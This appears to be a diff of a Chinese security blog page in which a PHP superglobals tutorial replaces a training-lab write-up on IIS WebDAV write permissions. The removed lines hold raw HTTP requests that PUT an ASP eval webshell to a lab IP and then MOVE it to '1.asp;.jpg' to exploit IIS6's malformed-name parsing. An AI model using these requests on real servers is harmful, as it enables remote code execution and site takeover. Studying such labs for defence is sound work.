@@ -55,27 +55,20 @@
   };
 </script>
 
-  <meta name="description" content="实训目标1、了解IIS WebDAV安全配置；2、了解HTTP标准方法外的其他一些方法；3、掌握HTTP PUT的方法测试利用；4、了解IIS6的畸形解析漏洞及利用测试方法；实训操作1、打开网站发现什么都没有，真的是干净的一批呀！2、打开burp进行抓包，查看包：3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限：">
-<meta name="keywords" content="Web,漏洞利用">
+  <meta name="description" content="超级全局变量PHP超级全局变量列表： $GLOBALS $_SERVER $_GET $_POST $_FILES $_ENV $_COOKIE $_SESSION $GLOBALS — 引用全局作用域中可用的全部变量1234567891011121314&amp;lt;?php /*	$GLOBALS 例子$a = 2;echo $GLOBALS[&quot;a&quot;];?&amp;gt;*/function test()&amp;">
+<meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="IIS写权限漏洞">
-<meta property="og:url" content="http://msxl.github.io/2019/09/24/IIS写权限漏洞/index.html">
+<meta property="og:title" content="2、超全局变量">
+<meta property="og:url" content="http://msxl.github.io/2020/05/21/2、超全局变量/index.html">
 <meta property="og:site_name" content="Pr0ud">
-<meta property="og:description" content="实训目标1、了解IIS WebDAV安全配置；2、了解HTTP标准方法外的其他一些方法；3、掌握HTTP PUT的方法测试利用；4、了解IIS6的畸形解析漏洞及利用测试方法；实训操作1、打开网站发现什么都没有，真的是干净的一批呀！2、打开burp进行抓包，查看包：3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限：">
+<meta property="og:description" content="超级全局变量PHP超级全局变量列表： $GLOBALS $_SERVER $_GET $_POST $_FILES $_ENV $_COOKIE $_SESSION $GLOBALS — 引用全局作用域中可用的全部变量1234567891011121314&amp;lt;?php /*	$GLOBALS 例子$a = 2;echo $GLOBALS[&quot;a&quot;];?&amp;gt;*/function test()&amp;">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://msxl.github.io/2019/09/24/IIS写权限漏洞/Image1.png">
-<meta property="og:image" content="http://msxl.github.io/2019/09/24/IIS写权限漏洞/Image2.png">
-<meta property="og:image" content="http://msxl.github.io/2019/09/24/IIS写权限漏洞/Image3.png">
-<meta property="og:image" content="http://msxl.github.io/2019/09/24/IIS写权限漏洞/Image4.png">
-<meta property="og:image" content="http://msxl.github.io/2019/09/24/IIS写权限漏洞/Image5.png">
-<meta property="og:image" content="http://msxl.github.io/2019/09/24/IIS写权限漏洞/Image6.png">
-<meta property="og:updated_time" content="2019-09-24T01:35:52.595Z">
+<meta property="og:updated_time" content="2020-05-21T12:37:31.182Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="IIS写权限漏洞">
-<meta name="twitter:description" content="实训目标1、了解IIS WebDAV安全配置；2、了解HTTP标准方法外的其他一些方法；3、掌握HTTP PUT的方法测试利用；4、了解IIS6的畸形解析漏洞及利用测试方法；实训操作1、打开网站发现什么都没有，真的是干净的一批呀！2、打开burp进行抓包，查看包：3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限：">
-<meta name="twitter:image" content="http://msxl.github.io/2019/09/24/IIS写权限漏洞/Image1.png">
+<meta name="twitter:title" content="2、超全局变量">
+<meta name="twitter:description" content="超级全局变量PHP超级全局变量列表： $GLOBALS $_SERVER $_GET $_POST $_FILES $_ENV $_COOKIE $_SESSION $GLOBALS — 引用全局作用域中可用的全部变量1234567891011121314&amp;lt;?php /*	$GLOBALS 例子$a = 2;echo $GLOBALS[&quot;a&quot;];?&amp;gt;*/function test()&amp;">
   <link rel="alternate" href="/atom.xml" title="Pr0ud" type="application/atom+xml">
-  <link rel="canonical" href="http://msxl.github.io/2019/09/24/IIS写权限漏洞/">
+  <link rel="canonical" href="http://msxl.github.io/2020/05/21/2、超全局变量/">
 
 
 <script id="page-configurations">
@@ -89,7 +82,7 @@
   };
 </script>
 
-  <title>IIS写权限漏洞 | Pr0ud</title>
+  <title>2、超全局变量 | Pr0ud</title>
   <meta name="generator" content="Hexo 3.9.0">
   
 
@@ -235,7 +228,7 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="http://msxl.github.io/2019/09/24/IIS写权限漏洞/">
+    <link itemprop="mainEntityOfPage" href="http://msxl.github.io/2020/05/21/2、超全局变量/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Pr0ud">
@@ -247,7 +240,7 @@
       <meta itemprop="name" content="Pr0ud">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">IIS写权限漏洞
+        <h1 class="post-title" itemprop="name headline">2、超全局变量
 
           
         </h1>
@@ -263,25 +256,12 @@
                 
               
 
-              <time title="创建时间：2019-09-24 09:13:14 / 修改时间：09:35:52" itemprop="dateCreated datePublished" datetime="2019-09-24T09:13:14+08:00">2019-09-24</time>
+              <time title="创建时间：2020-05-21 20:35:51 / 修改时间：20:37:31" itemprop="dateCreated datePublished" datetime="2020-05-21T20:35:51+08:00">2020-05-21</time>
             </span>
           
             
 
             
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞利用/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a></span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -295,27 +275,27 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="实训目标"><a href="#实训目标" class="headerlink" title="实训目标"></a>实训目标</h1><h4 id="1、了解IIS-WebDAV安全配置；"><a href="#1、了解IIS-WebDAV安全配置；" class="headerlink" title="1、了解IIS WebDAV安全配置；"></a>1、了解IIS WebDAV安全配置；</h4><h4 id="2、了解HTTP标准方法外的其他一些方法；"><a href="#2、了解HTTP标准方法外的其他一些方法；" class="headerlink" title="2、了解HTTP标准方法外的其他一些方法；"></a>2、了解HTTP标准方法外的其他一些方法；</h4><h4 id="3、掌握HTTP-PUT的方法测试利用；"><a href="#3、掌握HTTP-PUT的方法测试利用；" class="headerlink" title="3、掌握HTTP PUT的方法测试利用；"></a>3、掌握HTTP PUT的方法测试利用；</h4><h4 id="4、了解IIS6的畸形解析漏洞及利用测试方法；"><a href="#4、了解IIS6的畸形解析漏洞及利用测试方法；" class="headerlink" title="4、了解IIS6的畸形解析漏洞及利用测试方法；"></a>4、了解IIS6的畸形解析漏洞及利用测试方法；</h4><h1 id="实训操作"><a href="#实训操作" class="headerlink" title="实训操作"></a>实训操作</h1><h4 id="1、打开网站发现什么都没有，真的是干净的一批呀！"><a href="#1、打开网站发现什么都没有，真的是干净的一批呀！" class="headerlink" title="1、打开网站发现什么都没有，真的是干净的一批呀！"></a>1、打开网站发现什么都没有，真的是干净的一批呀！</h4><img src="/2019/09/24/IIS写权限漏洞/Image1.png" title="avatar"><h4 id="2、打开burp进行抓包，查看包："><a href="#2、打开burp进行抓包，查看包：" class="headerlink" title="2、打开burp进行抓包，查看包："></a>2、打开burp进行抓包，查看包：</h4><img src="/2019/09/24/IIS写权限漏洞/Image2.png" title="avatar"><h4 id="3、将GET方式-修改为-OPTIONS-方式-查看具有哪些操作权限："><a href="#3、将GET方式-修改为-OPTIONS-方式-查看具有哪些操作权限：" class="headerlink" title="3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限："></a>3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限：</h4><a id="more"></a>
+        <h3 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h3><h5 id="PHP超级全局变量列表："><a href="#PHP超级全局变量列表：" class="headerlink" title="PHP超级全局变量列表："></a>PHP超级全局变量列表：</h5><ul>
+<li><strong>$GLOBALS</strong></li>
+<li><strong>$_SERVER</strong></li>
+<li><strong>$_GET</strong></li>
+<li><strong>$_POST</strong></li>
+<li><strong>$_FILES</strong></li>
+<li><strong>$_ENV</strong></li>
+<li><strong>$_COOKIE</strong></li>
+<li><strong>$_SESSION</strong></li>
+</ul><h4 id="GLOBALS-—-引用全局作用域中可用的全部变量"><a href="#GLOBALS-—-引用全局作用域中可用的全部变量" class="headerlink" title="$GLOBALS — 引用全局作用域中可用的全部变量"></a>$GLOBALS — 引用全局作用域中可用的全部变量</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*	$GLOBALS 例子</span></span><br><span class="line"><span class="comment">$a = 2;</span></span><br><span class="line"><span class="comment">echo $GLOBALS["a"];</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> $GLOBALS[<span class="string">"a"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="number">3</span>;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure><a id="more"></a>
 
 
-<img src="/2019/09/24/IIS写权限漏洞/Image3.png" title="avatar">
+<h4 id="SERVER-—-服务器和执行环境信息"><a href="#SERVER-—-服务器和执行环境信息" class="headerlink" title="$_SERVER — 服务器和执行环境信息"></a>$_SERVER — 服务器和执行环境信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_($_SERVER);</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开头将GET改为OPTIONS</span><br><span class="line"></span><br><span class="line">OPTIONS/ HTTP/1.1</span><br></pre></td></tr></table></figure>
+<h4 id="GET-—-HTTP-GET-变量"><a href="#GET-—-HTTP-GET-变量" class="headerlink" title="$_GET — HTTP GET 变量"></a>$_GET — HTTP GET 变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print_r($_GET);</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/test.php?id=1&amp;key=2</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">Array ( [id] =&gt; 1 [key] =&gt; 2 )</span><br></pre></td></tr></table></figure>
 
-<h4 id="4、-查看其中有-PUT-和-MOVE-等操作权限，那下一步就可以上传一句话木马了："><a href="#4、-查看其中有-PUT-和-MOVE-等操作权限，那下一步就可以上传一句话木马了：" class="headerlink" title="4、 查看其中有 PUT 和 MOVE 等操作权限，那下一步就可以上传一句话木马了："></a>4、 查看其中有 PUT 和 MOVE 等操作权限，那下一步就可以上传一句话木马了：</h4><img src="/2019/09/24/IIS写权限漏洞/Image4.png" title="avatar">
+<h4 id="POST-—-HTTP-POST-变量"><a href="#POST-—-HTTP-POST-变量" class="headerlink" title="$_POST — HTTP POST 变量"></a>$_POST — HTTP POST 变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print_r($_POST)</span><br><span class="line"></span><br><span class="line">利用hackbar输出一个post请求</span><br><span class="line">user=111&amp;pass=11111&amp;submit=123</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">Array ( [user] =&gt; 111 [pass] =&gt; 11111 [submit] =&gt; 123 )</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">只保留用这四行就可以了，不然的话你上传木马会出现404</span><br><span class="line"></span><br><span class="line">OPTIONS替换为PUT</span><br><span class="line">PUT /1.txt HTTP/1.1</span><br><span class="line">Host: 219.153.49.228:47517</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">&lt;%eval request(&quot;0x3mSxl&quot;)%&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="COOKIE-—-HTTP-Cookies"><a href="#COOKIE-—-HTTP-Cookies" class="headerlink" title="$_COOKIE — HTTP Cookies"></a>$_COOKIE — HTTP Cookies</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print_r($_COOKIE);</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/test.php?_COOKIE=a</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">Array ( [PHPSESSID] =&gt; vngtv638vt4f5ektfssfi6j063 )</span><br></pre></td></tr></table></figure>
 
-<p>5、利用iis6文件解析漏洞，用MOVE改文件后缀名为.asp;.jpg：</p>
-<img src="/2019/09/24/IIS写权限漏洞/Image5.png" title="avatar">
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开头PUT改为MOVE，添加Destination: /1.asp;.jpg</span><br><span class="line"></span><br><span class="line">MOVE /1.txt HTTP/1.1</span><br><span class="line">Host: 219.153.49.228:47517</span><br><span class="line">Destination: /1.asp;.jpg</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&lt;%eval request(&quot;0x3mSxl&quot;)%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>6、蚁剑连接：</p>
-<img src="/2019/09/24/IIS写权限漏洞/Image6.png" title="avatar">
-
-<p>访问网站：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47517/1.asp;.jpg</span><br><span class="line">以上是连接成功的图片</span><br></pre></td></tr></table></figure>
+<h4 id="FILE-—-HTTP-文件上传变量"><a href="#FILE-—-HTTP-文件上传变量" class="headerlink" title="$_FILE — HTTP 文件上传变量"></a>$_FILE — HTTP 文件上传变量</h4><h4 id="REQUEST-—-HTTP-Request-变量，用于收集HTML表单提交的数据"><a href="#REQUEST-—-HTTP-Request-变量，用于收集HTML表单提交的数据" class="headerlink" title="$_REQUEST — HTTP Request 变量，用于收集HTML表单提交的数据"></a>$_REQUEST — HTTP Request 变量，用于收集HTML表单提交的数据</h4><h4 id="SESSION-—-Session-变量"><a href="#SESSION-—-Session-变量" class="headerlink" title="$_SESSION — Session 变量"></a>$_SESSION — Session 变量</h4><h4 id="ENV-—-环境变量"><a href="#ENV-—-环境变量" class="headerlink" title="$_ENV — 环境变量"></a>$_ENV — 环境变量</h4>
     </div>
 
     
@@ -341,9 +321,7 @@
           
           <div class="post-tags">
             
-              <a href="/tags/Web/" rel="tag"># Web</a>
-            
-              <a href="/tags/漏洞利用/" rel="tag"># 漏洞利用</a>
+              <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
             
           </div>
         
@@ -353,8 +331,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/09/11/CVE-2019-0232漏洞复现/" rel="next" title="CVE-2019-0232漏洞复现">
-                  <i class="fa fa-chevron-left"></i> CVE-2019-0232漏洞复现
+                <a href="/2020/05/21/1、php核心配置/" rel="next" title="1、php核心配置">
+                  <i class="fa fa-chevron-left"></i> 1、php核心配置
                 </a>
               
             </div>
@@ -363,8 +341,8 @@
 
             <div class="post-nav-prev post-nav-item">
               
-                <a href="/2019/10/12/渗透测试之meterpreter简单使用/" rel="prev" title="渗透测试之meterpreter简单使用">
-                  渗透测试之meterpreter简单使用 <i class="fa fa-chevron-right"></i>
+                <a href="/2020/05/21/3、命令注入/" rel="prev" title="3、命令注入">
+                  3、命令注入 <i class="fa fa-chevron-right"></i>
                 </a>
               
             </div>
@@ -414,7 +392,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实训目标"><span class="nav-number">1.</span> <span class="nav-text">实训目标</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、了解IIS-WebDAV安全配置；"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">1、了解IIS WebDAV安全配置；</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、了解HTTP标准方法外的其他一些方法；"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">2、了解HTTP标准方法外的其他一些方法；</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、掌握HTTP-PUT的方法测试利用；"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">3、掌握HTTP PUT的方法测试利用；</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、了解IIS6的畸形解析漏洞及利用测试方法；"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">4、了解IIS6的畸形解析漏洞及利用测试方法；</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实训操作"><span class="nav-number">2.</span> <span class="nav-text">实训操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、打开网站发现什么都没有，真的是干净的一批呀！"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">1、打开网站发现什么都没有，真的是干净的一批呀！</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、打开burp进行抓包，查看包："><span class="nav-number">2.0.0.2.</span> <span class="nav-text">2、打开burp进行抓包，查看包：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、将GET方式-修改为-OPTIONS-方式-查看具有哪些操作权限："><span class="nav-number">2.0.0.3.</span> <span class="nav-text">3、将GET方式 修改为 OPTIONS 方式 查看具有哪些操作权限：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、-查看其中有-PUT-和-MOVE-等操作权限，那下一步就可以上传一句话木马了："><span class="nav-number">2.0.0.4.</span> <span class="nav-text">4、 查看其中有 PUT 和 MOVE 等操作权限，那下一步就可以上传一句话木马了：</span></a></li></ol></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#超级全局变量"><span class="nav-number">1.</span> <span class="nav-text">超级全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP超级全局变量列表："><span class="nav-number">1.0.1.</span> <span class="nav-text">PHP超级全局变量列表：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GLOBALS-—-引用全局作用域中可用的全部变量"><span class="nav-number">1.1.</span> <span class="nav-text">$GLOBALS — 引用全局作用域中可用的全部变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SERVER-—-服务器和执行环境信息"><span class="nav-number">1.2.</span> <span class="nav-text">$_SERVER — 服务器和执行环境信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GET-—-HTTP-GET-变量"><span class="nav-number">1.3.</span> <span class="nav-text">$_GET — HTTP GET 变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST-—-HTTP-POST-变量"><span class="nav-number">1.4.</span> <span class="nav-text">$_POST — HTTP POST 变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#COOKIE-—-HTTP-Cookies"><span class="nav-number">1.5.</span> <span class="nav-text">$_COOKIE — HTTP Cookies</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FILE-—-HTTP-文件上传变量"><span class="nav-number">1.6.</span> <span class="nav-text">$_FILE — HTTP 文件上传变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#REQUEST-—-HTTP-Request-变量，用于收集HTML表单提交的数据"><span class="nav-number">1.7.</span> <span class="nav-text">$_REQUEST — HTTP Request 变量，用于收集HTML表单提交的数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SESSION-—-Session-变量"><span class="nav-number">1.8.</span> <span class="nav-text">$_SESSION — Session 变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ENV-—-环境变量"><span class="nav-number">1.9.</span> <span class="nav-text">$_ENV — 环境变量</span></a></li></ol></li></ol></div>
         
       </div>
       <!--/noindex-->
